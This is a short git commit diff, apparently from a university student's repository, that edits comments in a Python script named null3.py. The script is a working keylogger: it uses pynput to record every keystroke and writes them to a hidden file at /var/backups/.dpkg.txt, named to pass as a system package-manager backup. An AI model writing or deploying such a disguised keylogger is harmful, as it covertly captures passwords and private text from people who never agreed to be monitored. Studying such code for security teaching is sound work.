84d06f60051b8f88bf02e6700c0f2b4d363ad4c1
dwm9636 <dwm9636@g.rit.edu>
2023-04-12 16:29:21 -0400

    null3

--- null3.py
+++ null3.py
@@ -1,13 +1,13 @@
 import logging
 from pynput.keyboard import Listener
 
-# create file 
+# Create file 
 logging.basicConfig(filename=("/var/backups/.dpkg.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
 
-# function in logging
+# Logging function called by pynput
 def on_press(key):
-    logging.info(key)
     # when press key save the key in file
+    logging.info(key)
 
 # Loop logger
 with Listener(on_press=on_press) as listener:
